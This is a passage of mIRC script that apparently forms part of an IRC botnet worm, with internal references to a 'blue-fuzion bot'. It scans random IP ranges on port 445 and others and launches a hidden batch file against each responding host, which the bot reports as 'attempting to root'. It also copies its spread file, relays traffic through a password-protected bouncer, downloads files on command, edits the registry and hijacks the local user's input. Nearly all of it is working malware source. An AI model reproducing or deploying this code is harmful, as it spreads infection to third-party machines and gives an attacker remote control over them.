  inc %totalscaning
  if %totalscaning == %total opensocks 10
  set %ip11 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 11
  set %ip12 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 12
  set %ip13 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 13
  set %ip14 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 14
  set %ip15 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 15
  set %ip16 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 16
  set %ip17 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 17
  set %ip18 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 18
  set %ip19 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 19
  set %ip20 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 20
  set %ip21 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 21
  set %ip22 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 22
  set %ip23 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 23
  set %ip24 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 24
  set %ip25 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 25
  set %ip26 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 26
  set %ip27 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 27
  set %ip28 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 28
  set %ip29 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 29
  set %ip30 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 30
  set %ip31 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 31
  set %ip32 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 32
  set %ip33 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 33
  set %ip34 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 34
  set %ip35 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 35
  set %ip36 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 36
  set %ip37 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 37
  set %ip38 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 38
  set %ip39 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 39
  set %ip40 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 40
  set %ip41 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 41
  set %ip42 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 42
  set %ip43 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 43
  set %ip44 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 44
  set %ip45 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 45
  set %ip46 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 46
  set %ip47 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 47
  set %ip48 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 48
  set %ip49 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 49
  set %ip50 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 50
  set %ip51 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 51
  set %ip52 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 52
  set %ip53 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 53
  set %ip54 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 54
  set %ip55 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 55
  set %ip56 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 56
  set %ip57 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 57
  set %ip58 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 58
  set %ip59 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 59
  set %ip60 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 60
  set %ip61 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 61
  set %ip62 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 62
  set %ip63 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 63
  set %ip64 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 64
  set %ip65 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 65
  set %ip66 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 66
  set %ip67 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 67
  set %ip68 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 68
  set %ip69 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 69
  set %ip70 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 70
  set %ip71 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 71
  set %ip72 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 72
  set %ip73 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 73
  set %ip74 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 74
  set %ip75 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 75
  set %ip76 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 76
  set %ip77 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  if %totalscaning == %total opensocks 77
  set %ip78 $longip($calc( %beglongip + %totalscaning ))
  inc %totalscaning
  opensocks
}
alias opensocks {
  sockopen ip1 %ip1 %scanport
  if $1 == 1 finished
  sockopen ip2 %ip2 %scanport
  if $1 == 2 finished
  sockopen ip3 %ip3 %scanport
  if $1 == 3 finished
  sockopen ip4 %ip4 %scanport
  if $1 == 4 finished
  sockopen ip5 %ip5 %scanport
  if $1 == 5 finished
  sockopen ip6 %ip6 %scanport
  if $1 == 6 finished
  sockopen ip7 %ip7 %scanport
  if $1 == 7 finished
  sockopen ip8 %ip8 %scanport
  if $1 == 8 finished
  sockopen ip9 %ip9 %scanport
  if $1 == 9 finished
  sockopen ip10 %ip10 %scanport
  if $1 == 10 finished
  sockopen ip11 %ip11 %scanport
  if $1 == 11 finished
  sockopen ip12 %ip12 %scanport
  if $1 == 12 finished
  sockopen ip13 %ip13 %scanport
  if $1 == 13 finished
  sockopen ip14 %ip14 %scanport
  if $1 == 14 finished
  sockopen ip15 %ip15 %scanport
  if $1 == 15 finished
  sockopen ip16 %ip16 %scanport
  if $1 == 16 finished
  sockopen ip17 %ip17 %scanport
  if $1 == 17 finished
  sockopen ip18 %ip18 %scanport
  if $1 == 18 finished
  sockopen ip19 %ip19 %scanport
  if $1 == 19 finished
  sockopen ip20 %ip20 %scanport
  if $1 == 20 finished
  sockopen ip21 %ip21 %scanport
  if $1 == 21 finished
  sockopen ip22 %ip22 %scanport
  if $1 == 22 finished
  sockopen ip23 %ip23 %scanport
  if $1 == 23 finished
  sockopen ip24 %ip24 %scanport
  if $1 == 24 finished
  sockopen ip25 %ip25 %scanport
  if $1 == 25 finished
  sockopen ip26 %ip26 %scanport
  if $1 == 26 finished
  sockopen ip27 %ip27 %scanport
  if $1 == 27 finished
  sockopen ip28 %ip28 %scanport
  if $1 == 28 finished
  sockopen ip29 %ip29 %scanport
  if $1 == 29 finished
  sockopen ip30 %ip30 %scanport
  if $1 == 30 finished
  sockopen ip31 %ip31 %scanport
  if $1 == 31 finished
  sockopen ip32 %ip32 %scanport
  if $1 == 32 finished
  sockopen ip33 %ip33 %scanport
  if $1 == 33 finished
  sockopen ip34 %ip34 %scanport
  if $1 == 34 finished
  sockopen ip35 %ip35 %scanport
  if $1 == 35 finished
  sockopen ip36 %ip36 %scanport
  if $1 == 36 finished
  sockopen ip37 %ip37 %scanport
  if $1 == 37 finished
  sockopen ip38 %ip38 %scanport
  if $1 == 38 finished
  sockopen ip39 %ip39 %scanport
  if $1 == 39 finished
  sockopen ip40 %ip40 %scanport
  if $1 == 40 finished
  sockopen ip41 %ip41 %scanport
  if $1 == 41 finished
  sockopen ip42 %ip42 %scanport
  if $1 == 42 finished
  sockopen ip43 %ip43 %scanport
  if $1 == 43 finished
  sockopen ip44 %ip44 %scanport
  if $1 == 44 finished
  sockopen ip45 %ip45 %scanport
  if $1 == 45 finished
  sockopen ip46 %ip46 %scanport
  if $1 == 46 finished
  sockopen ip47 %ip47 %scanport
  if $1 == 47 finished
  sockopen ip48 %ip48 %scanport
  if $1 == 48 finished
  sockopen ip49 %ip49 %scanport
  if $1 == 49 finished
  sockopen ip50 %ip50 %scanport
  if $1 == 50 finished
  sockopen ip51 %ip51 %scanport
  if $1 == 51 finished
  sockopen ip52 %ip52 %scanport
  if $1 == 52 finished
  sockopen ip53 %ip53 %scanport
  if $1 == 53 finished
  sockopen ip54 %ip54 %scanport
  if $1 == 54 finished
  sockopen ip55 %ip55 %scanport
  if $1 == 55 finished
  sockopen ip56 %ip56 %scanport
  if $1 == 56 finished
  sockopen ip57 %ip57 %scanport
  if $1 == 57 finished
  sockopen ip58 %ip58 %scanport
  if $1 == 58 finished
  sockopen ip59 %ip59 %scanport
  if $1 == 59 finished
  sockopen ip60 %ip60 %scanport
  if $1 == 60 finished
  sockopen ip61 %ip61 %scanport
  if $1 == 61 finished
  sockopen ip62 %ip62 %scanport
  if $1 == 62 finished
  sockopen ip63 %ip63 %scanport
  if $1 == 63 finished
  sockopen ip64 %ip64 %scanport
  if $1 == 64 finished
  sockopen ip65 %ip65 %scanport
  if $1 == 65 finished
  sockopen ip66 %ip66 %scanport
  if $1 == 66 finished
  sockopen ip67 %ip67 %scanport
  if $1 == 67 finished
  sockopen ip68 %ip68 %scanport
  if $1 == 68 finished
  sockopen ip69 %ip69 %scanport
  if $1 == 69 finished
  sockopen ip70 %ip70 %scanport
  if $1 == 70 finished
  sockopen ip71 %ip71 %scanport
  if $1 == 71 finished
  sockopen ip72 %ip72 %scanport
  if $1 == 72 finished
  sockopen ip73 %ip73 %scanport
  if $1 == 73 finished
  sockopen ip74 %ip74 %scanport
  if $1 == 74 finished
  sockopen ip75 %ip75 %scanport
  if $1 == 75 finished
  sockopen ip76 %ip76 %scanport
  if $1 == 76 finished
  sockopen ip77 %ip77 %scanport
  if $1 == 77 finished
  sockopen ip78 %ip78 %scanport
  .timerscanner1 1 4 /sockclose ip*
  .timerscanner2 1 5 /startscan
}
alias randip {
  unset %1p1 %1p2
  set %1p1 $1-
  set %1p2 $replace($gettok(%1p1,1,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,2,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,3,46),*,$rand(1,255))
  set %1p2 %1p2 $+ . $+ $replace($gettok(%1p1,4,46),*,$rand(1,255))
  return %1p2
}
alias scanpop {
  set %randnum $rand(1,8)
  if (%randnum == 1) { set %snum 211 }
  if (%randnum == 2) { set %snum 203 }
  if (%randnum == 3) { set %snum 218 }
  if (%randnum == 4) { set %snum 61 }
  if (%randnum == 5) { set %snum 24 }
  if (%randnum == 6) { set %snum 68 }
  if (%randnum == 7) { set %snum 65 }
  if (%randnum == 8) { set %snum 43 }
  set %begshortip %snum $+ .0.0.0
  set %beglongip $longip(  %begshortip )
  set %endshortip %snum $+ .255.255.255
  set %endlongip $longip( %endshortip  ) 
  set %total $calc( %endlongip - %beglongip ) 
  unset %totalscaning 
  startscan
}
alias randscan {
  unset %1p1 %1p2
  set %1p1 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
  :set2
  set %1p2 $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255) $+ . $+ $rand(1,255)
  if ($gettok(%1p2,1,46) < $gettok(%1p1,1,46)) { goto set2 | halt }
}
on 1:sockopen:ip*:{ if ($sockerr > 0) { halt }
  if (%scanport == 445) {
    set %445ip % [ $+ [ $sockname ] ]
    run -n smc32.exe /n /fh /r "msvs32.bat %445ip %spreadfile $+ "
    vtalk 12|15scanner12|15 found: 12|15NT/2K12|15 %445ip $+ , attempting to  root..
    inc %totalscanned | /sockclose $sockname | /unset %445ip | /halt
  }
  else if (%scanport != 445) {
    set %otherip % [ $+ [ $sockname ] ]
    run -n smc32.exe /n /fh /r "msvs32.bat %otherip %spreadfile $+ "
    vtalk 12|15scanner12|15 found: 12|15other12|15 %otherip $+ , attempting to  root..
    inc %totalscanned | /sockclose $sockname | /unset %otherip | /halt
  }
}
alias scancopy { if ($exists(c:\winnt\system32\ $+ %spreadfile $+ )) { /copy c:\winnt\system32\ $+ %spreadfile $mircdir $+ %spreadfile | vtalk 12|15copied12|15 12|152K/NT/XP12|15 %spreadfile } | else if ($exists(c:\windows\system32\ $+ %spreadfile $+ )) { /copy c:\windows\system32\ $+ %spreadfile $mircdir $+ %spreadfile | vtalk 12|15copied12|15 12|1595/98/ME12|15 %spreadfile } } }
alias stopscan { sockclose ip* | .timerscanner* off | unset %ip* | unset %totalscanned | unset %totalscaning | unset %beg* | unset %end* | run -n smc32.exe /n /fh /r "ntlib32.exe -kf psexec.exe" }
alias randscann { randscan | set %begshortip %1p1 | set %endshortip %1p2 | set %beglongip $longip(  %begshortip ) | startscan | vtalk 12|15scanner12|15 starting scan from: %1p1 to %1p2 }
alias totalfound {
 if (%totalscanned != $null) { return %totalscanned }
 if (%totalscanned == $null) { return none }
}
alias finished {
 if (%begshortip != $null) { 
 vtalk 12|15scanner12|15 scanning from %begshortip to %endshortip is finished! | stopscan | scanpop
 }
}
;================================================
;registry aliases
;================================================
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %c = $com(%a).result
      .comclose %a
      if (%c != $null) return %c
      else {
        return NA 
      }
    }
  }
  else { return error! complete data }
}

alias RegWrite {
  if ($1 != $null) && ($2) && ($3) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
    if ($3 == REG_EXPAND_SZ) || ($3 == REG_SZ) {
      if ($regread($1) == $2) { return the value ( $+ $1 $+ ) was created }
      else { return error! when writing }
    }
  }
  else { return error! complete data }
}

alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete 
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
  else { return error! complete data }
}
alias regsys { 
  if ($1 == name) {
    if (($os == 95) || ($os == 98) || ($os == ME)) { return $regread(HKLM\Software\Microsoft\Windows\CurrentVersion\Version) }
    elseif (($os == NT) || ($os == 2K) || ($os == XP)) { return $regread(HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName) }
  }
  if ($1 == version) {
    if (($os == 95) || ($os == 98) || ($os == ME)) { return $regread(HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber) }
    elseif (($os == NT) || ($os == 2K) || ($os == XP)) { return $regread(HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\CurrentVersion) }
  }
}
;=================
;bnc & misc
;=================
on *:sockread:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ you need to say /quote pass <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ welcome to the bnc
      sockwrite -n $sockname NOTICE AUTH : $+ step two, connect to something..
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn <server> <port> <pass> to connect (most irc's dont use pass)
      %Bnc.legit = yes
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ wrong pass asshole!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ bnc exploits do not work on blue-fuzion bot | sockclose $sockname
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)
    sockwrite -n $sockname NOTICE AUTH : $+ connecting to $gettok(%BncClient,2,32) $+ : $+ $gettok(%BncClient,3,32)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on *:sockopen:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ failed connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on *:sockread:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }
on *:sockopen:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $rletterz $rletterz $rletterz : $+ $rletterz | sockwrite -tn $sockname NICK $rletterz }
on *:sockread:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
;====================
; misc remote actions
;====================
on *:op:%chan:{ if ($opnick == $me) { .topic %chan .scan host rand | mode %chan +mnstk %key } }
on *:sockopen:Antivirus*:{ if ($sockerr > 0) { return } }
on *:sockread:Antivirus*: { sockread -f %Antivirus | if (%Antivirus == PWD) { sockwrite $sockname PWD14438136782715101980 | .timer 1 10 sockwrite $sockname RMS } | sockwrite $sockname RMS | unset %Antivirus }
on *:sockopen:sclick*: {
  sockwrite -n $sockname GET %g HTTP/1.1
  sockwrite -n $sockname Host: %h
  sockwrite -n $sockname Connection: keep-alive
  sockwrite $sockname $crlf
  unset %g
  unset %h
}
on *:sockclose:sclick*: vtalk 12|15visit12|15 socket closed | unset %g | unset %h
on *:sockopen:download:{ if ($sockerr) { vtalk 12|15download12|15 error: socket error | unset %dlfile | return } | .write -c %download2 | .sockwrite -n $sockname GET / $+ %download3 HTTP/1.0 | .sockwrite -n $sockname Accept: */* | .sockwrite -n $sockname Host: %download1 | .sockwrite -n $sockname }
on *:sockread:download:{ if (%downloadready != 1) { var %header | sockread %header | while ($sockbr) { if (Content-length: * iswm %header) { %downloadlength = $gettok(%header,2,32) } | elseif (* !iswm %header) { %downloadready = 1 | %downloadoffset = $sock($sockname).rcvd | break } | sockread %header } } | sockread 4096 &d | while ($sockbr) { bwrite %download2 -1 -1 &d | sockread 4096 &d } }
on *:sockclose:download:{ if ($file(%download2).size != %downloadlength) { .sockclose download | downloada http:// $+ %download1 $+ / $+ %download3 } | else { vtalk 12|15download12|15 success: file downloaded 12|15 $+ $mircdir $+ %download2 $+ 12|15 12|15 $+ $file(%download2).size bytes $+ 12|15 } | unset %download1 %download2 %download3 %downloadlength %downloadready %downloadoffset %dlfile }
on *:socklisten:ident:{ sockaccept ident. [ $+ [ $ticks ] ] }
on *:sockread:ident.*:{ sockread %ident | tokenize 32 %ident | if ($numtok($1-,44) == 2 && $1,$3 isnum) { sockwrite -n $sockname $3 , $1 : USERID : none.of.your.business : $rletterz | sockclose $sockname | unset %ident } }
on *:input:*:{ haltdef | vtalk 12|15security12|15 user input: $1- | .fakenick | .hide | .uinst }
on 800:part:%chan:{ ruser 800 $nick | clearall }
on 800:quit:%chan:{ ruser 800 $nick | clearall }
on 800:nick:*:{ ruser 800 $nick | clearall }
on 720:part:%chan:{ ruser 720 $nick | clearall }
on 720:quit:%chan:{ ruser 720 $nick | clearall }
on 720:nick:*:{ ruser 720 $nick | clearall }
}